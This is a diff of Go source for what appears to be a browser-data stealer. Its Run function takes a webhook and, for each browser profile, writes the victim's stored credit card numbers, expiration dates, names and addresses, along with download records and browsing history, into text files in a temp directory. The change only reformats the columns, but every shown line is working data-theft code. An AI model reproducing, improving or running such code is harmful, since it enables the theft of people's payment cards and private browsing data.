@@ -189,23 +189,23 @@ func Run(webhook string) {
 		}
 
 		if len(profile.CreditCards) > 0 {
-			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-50s %-50s %-50s %-50s %-50s %-50s %-50s", "GUID", "Name", "Expiration Year", "Expiration Month", "Number", "Address", "Nickname"))
+			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", "Number", "Expiration Month", "Expiration Year", "Name", "Address"))
 			for _, cc := range profile.CreditCards {
-				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-50s %-50s %-50s %-50s %-50s %-50s %-50s", cc.GUID, cc.Name, cc.ExpirationYear, cc.ExpirationMonth, cc.Number, cc.Address, cc.Nickname))
+				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "credit_cards.txt"), fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address))
 			}
 		}
 
 		if len(profile.Downloads) > 0 {
-			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-50s %-50s", "Target Path", "URL"))
+			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", "Target Path", "URL"))
 			for _, download := range profile.Downloads {
-				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-50s %-50s", download.TargetPath, download.URL))
+				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "downloads.txt"), fmt.Sprintf("%-70s %-70s", download.TargetPath, download.URL))
 			}
 		}
 
 		if len(profile.History) > 0 {
-			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-50s %-50s", "Title", "URL"))
+			fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", "Title", "URL"))
 			for _, history := range profile.History {
-				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-50s %-50s", history.Title, history.URL))
+				fileutil.AppendFile(filepath.Join(tempdir, profile.Browser.User, profile.Browser.Name, profile.Name, "history.txt"), fmt.Sprintf("%-70s %-70s", history.Title, history.URL))
 			}
 		}
 
